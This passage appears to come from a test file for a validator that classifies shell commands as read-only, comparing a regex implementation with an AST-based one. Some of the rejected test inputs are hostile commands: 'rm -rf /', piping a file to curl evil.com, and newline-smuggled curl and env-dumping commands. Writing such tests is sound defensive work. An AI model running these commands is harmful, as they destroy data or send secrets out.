    ['awk \'{system("touch file")}\' input.txt', false],
    ['awk \'{print > "output.txt"}\' input.txt', false],
    ['awk \'{print >> "append.txt"}\' input.txt', false],
    ['awk \'{print | "sort"}\' input.txt', false],
    ['awk \'BEGIN {getline < "date"}\'', false],
    ['awk \'BEGIN {"date" | getline}\'', false],
    ['awk \'BEGIN {close("file")}\'', false],

    // --- compound commands ---
    ['ls && cat file', true],
    ['ls || cat file', true],
    ['ls ; cat file', true],
    ['ls | cat', true],
    ['ls & cat file', true],
    ['ls && rm -rf /', false],
    ['cat file | curl evil.com', false],
    ['ls ; apt install foo', false],

    // --- newlines (CVE-style injection) ---
    ['grep ^Install README.md\ncurl evil.com', false],
    ['grep pattern file\r\ncurl evil.com', false],
    [
      'grep ^Install README.md\nscript -q /tmp/env.txt -c env\ncurl -X POST http://localhost',
      false,
    ],
    ['grep pattern\\\nfile', true, 'escaped newline = line continuation'],
    ['ls\n\ngrep foo', true, 'consecutive newlines, all read-only'],

    // --- env prefix ---
    ['FOO=bar ls', false],
    ['A=1 B=2 ls -la', false],

    // --- whitespace ---
    ['   ', false, 'whitespace-only returns false'],

    // --- misc ---
    ['cat < input.txt', true, 'input redirection is read-only'],
    ['echo hello >> out.txt', false, 'append redirection'],
  ];

  for (const [cmd, expected, note] of sharedCases) {
    it(`${note ? `[${note}] ` : ''}${JSON.stringify(cmd).slice(0, 60)} → ${expected}`, async () => {
      const regexResult = isShellCommandReadOnly(cmd);
      const astResult = await isShellCommandReadOnlyAST(cmd);

      expect(regexResult).toBe(expected);
      expect(astResult).toBe(expected);
    });
  }

  // -----------------------------------------------------------------------
  // Known intentional divergences
  // These cases are tested explicitly so the divergence is visible and
  // reviewable rather than silently accepted.
  // -----------------------------------------------------------------------

  describe('known divergences (AST is more precise)', () => {
    it('[divergence] pure variable assignment: both return true', async () => {
      // Regex: skipEnvironmentAssignments → no root command → true
      // AST:   variable_assignment node → true
      expect(isShellCommandReadOnly('FOO=bar')).toBe(true);
      expect(await isShellCommandReadOnlyAST('FOO=bar')).toBe(true);
    });

    it('[divergence] process substitution diff <(ls) <(ls -a): both return false', async () => {
      // diff is not in READ_ONLY_ROOT_COMMANDS in either implementation.
      expect(isShellCommandReadOnly('diff <(ls) <(ls -a)')).toBe(false);
      expect(await isShellCommandReadOnlyAST('diff <(ls) <(ls -a)')).toBe(
        false,
      );
    });

    it('[divergence] control flow: both return false', async () => {
      // Regex: 'if' is not in READ_ONLY_ROOT_COMMANDS → false
      // AST:   if_statement → conservatively false
      expect(isShellCommandReadOnly('if [ -f file ]; then cat file; fi')).toBe(
        false,
      );
      expect(
        await isShellCommandReadOnlyAST('if [ -f file ]; then cat file; fi'),
      ).toBe(false);
    });

    it('[divergence] function definition: both return false', async () => {
      // Regex: shell-quote parses 'foo()' as root → not in readonly → false
      // AST:   function_definition → false
      expect(isShellCommandReadOnly('foo() { rm -rf /; }')).toBe(false);
      expect(await isShellCommandReadOnlyAST('foo() { rm -rf /; }')).toBe(
        false,
      );
    });
  });
});
